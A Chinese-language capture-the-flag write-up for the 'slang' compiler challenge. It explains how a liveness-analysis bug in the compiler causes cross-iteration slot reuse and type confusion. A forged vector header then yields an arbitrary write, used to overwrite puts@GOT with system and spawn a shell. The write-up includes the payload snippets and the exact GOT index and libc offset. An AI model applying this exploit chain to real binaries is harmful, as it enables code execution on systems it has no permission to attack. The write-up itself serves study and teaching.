# slang

## 题目简述

服务接收自定义 `slang` 源码，将其转成 C、用 GCC 编译成非 PIE ELF 后执行。生成代码把所有局部变量统一存入 `uintptr_t slot[]`，使用时再按声明类型强制转换。编译器活跃性扫描 `alloc_scan_stmt()` 在循环内遇到返回 `void` 的函数调用时，会跳过所有实参，导致仍会在下一轮使用的变量槽被提前复用。

利用该错误可让一个字符串覆盖原 `vec` 所在 slot。下一轮调用仍把该 slot 当作 `vec_t`，由伪造的 `data` 和 `size` 得到任意地址加减写，最终把 `puts@GOT` 改成 `system`。

## 解题过程

### 1. 构造跨循环的槽位复用

漏洞逻辑可简化为：

```c
if (!(in_loop && proto->ret == TY_VOID))
    scan_all_call_arguments();
```

因此把 `vec_slot` 作为 void 函数 `pwn` 的参数放进循环，同时在调用后声明 `forged_header`。分配器误以为 `vec_slot` 已死亡，让两者共享同一 slot：

```slang
do {
  pwn(round, vec_slot);
  forged_header := forge();
  round := round + 1;
} while (round < 2);
```

第一轮 `pwn` 直接返回，随后 `forge()` 写入同一 slot；第二轮 `pwn(round, vec_slot)` 的代码仍会生成，但实参实际已经是字符串指针。

### 2. 伪造 vec_t 获得任意加减写

`vec_t` 布局为：

```c
struct vec_t {
    int64_t *data;
    int64_t size;
};
```

让 `forge()` 返回 16 字节字符串，其前 8 字节为 0，后 8 字节为 `0x7fffffffffffffff`。字符串 header 被当作 vec 后等价于：

```text
data = 0
size = INT64_MAX
```

于是边界检查形同虚设，`scribble(vec, idx, delta)` 会执行：

$$
*(\mathrm{int64\_t} *)(8\times idx)\mathrel{+}=delta.
$$

对任意 8 字节对齐地址 $A$，取 $idx=A/8$ 即可修改其内容。

### 3. 把 puts 改成 system

生成 ELF 使用 `-no-pie`，`puts@GOT` 地址固定为 `0x404018`。先调用一次 `say` 触发 lazy binding，使 GOT 中保存 libc 的真实 `puts`；再使用题目配套 libc 的固定差值：

```text
index = 0x404018 / 8 = 526339
system - puts = -205200
```

核心语句为：

```slang
say("resolve puts");
scribble(forged_vec, 526339, -205200);
say("/bin/sh");
```

第三行生成的 `puts("/bin/sh")` 实际调用已被改写的 `system("/bin/sh")`。完整 payload 还需要保留一个无关的活跃标记，稳定编译器的 slot 分配；发送源码后以 `END_OF_SOURCE` 结束输入。

## 方法总结

本题是编译器后端错误转化为内存破坏的典型例子：活跃性分析与代码生成对同一实参的认识不一致，造成跨迭代类型混淆。复现时应先查看生成 C，确认 `vec_slot` 与 `forged_header` 确实落到同一 `slot[n]`；随后再计算 GOT 索引和配套 libc 的符号差值。若服务更换 libc，`-205200` 不能照抄，必须从实际 `puts`/`system` 符号重新计算。
